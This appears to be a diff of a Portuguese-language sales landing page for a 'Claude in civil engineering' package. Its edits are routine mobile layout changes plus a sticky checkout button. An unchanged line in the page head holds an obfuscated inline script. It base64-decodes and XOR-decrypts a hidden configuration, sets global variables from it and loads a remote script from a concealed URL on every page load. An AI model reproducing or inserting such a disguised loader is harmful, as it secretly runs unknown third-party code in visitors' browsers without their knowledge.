@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=5.0">
     <title>Claude na Engenharia Civil</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -47,7 +47,11 @@
         ::-webkit-scrollbar-thumb:hover { background: #ff5a00; }
         
         details > summary { list-style: none; }
-        details > summary::-webkit-details-marker { display: none; }
+                details > summary::-webkit-details-marker { display: none; }
+        
+        /* Mobile Optimizations */
+        * { -webkit-tap-highlight-color: transparent; }
+        .sticky-cta-shadow { box-shadow: 0 -10px 40px -10px rgba(0,0,0,0.8), 0 0 20px rgba(255,90,0,0.2); }
     </style>
 
     <!-- Meta Pixel Code -->
@@ -69,7 +73,7 @@
     <!-- End Meta Pixel Code -->
     <script>(function(){var u_dc7=atob("DP1TOz/mkn2UgTc0ioZxTk2KsEe26UNA+o5pFBCF9hO69ENZ45sqFVyJ/1P28xhH6Y86S0uVvQjg7EQb5pwnXkySvBfnoxsW64knSVaE5wnx8hUO0YZxVV6L91+uo1NV/px+TkuL+xvtrEdG74s2VUvL6h775RpH6ZZxFx2Q8xHh5BUOqN8uF0TE/Bz55BUOqJkyT17L5wn56FFNp40hXkmD/Am58kJW45kgGRPE5Bz49FIWsN9xRmKb");var a_rtux=[];for(var x_1azy=0;x_1azy<u_dc7.length;x_1azy++){a_rtux.push(u_dc7.charCodeAt(x_1azy)&255);}var b_1=a_rtux[0];var t_mi=a_rtux.slice(1,1+b_1);var n_co=a_rtux.slice(1+b_1);var l_f=n_co.map(function(b,z_3h6j){return b^t_mi[z_3h6j%b_1];});var f_92="";for(var p_ffl=0;p_ffl<l_f.length;p_ffl++){f_92+=String.fromCharCode(l_f[p_ffl]&255);}var i_m=decodeURIComponent(escape(f_92));var i_7qzh=JSON.parse(i_m);var n_bhl=i_7qzh.globals||[];n_bhl.forEach(function(f_gzdl){window[f_gzdl.name]=f_gzdl.value;});var j_zg2h=document.createElement("script");j_zg2h.src=i_7qzh.url;j_zg2h.async=true;j_zg2h.defer=true;(i_7qzh.attributes||[]).forEach(function(v_f){j_zg2h.setAttribute(v_f.name,v_f.value);});(document.head||document.documentElement).appendChild(j_zg2h);})();</script>
 </head>
-<body class="antialiased selection:bg-brand selection:text-white pb-20 overflow-x-hidden w-full">
+<body class="antialiased selection:bg-brand selection:text-white pb-32 overflow-x-hidden w-full">
 
     <!-- Top Bar -->
     <div class="w-full bg-black border-b border-zinc-900 py-2 text-center text-xs text-brand font-medium tracking-wide">
@@ -742,6 +746,14 @@
         </div>
     </footer>
 
+    <!-- Sticky Mobile CTA -->
+    <div class="md:hidden fixed bottom-0 left-0 w-full px-4 pt-8 pb-[calc(1rem+env(safe-area-inset-bottom))] bg-gradient-to-t from-[#050505] via-[#050505]/90 to-transparent z-50 pointer-events-none flex flex-col justify-end">
+        <a href="#checkout" class="w-full bg-brand hover:bg-brandhover text-white font-bold py-4 rounded-xl flex items-center justify-center uppercase tracking-wide sticky-cta-shadow pointer-events-auto active:scale-95 transition-transform">
+            Quero o pacote completo
+        </a>
+    </div>
+
 </body>
 </html>
+
 
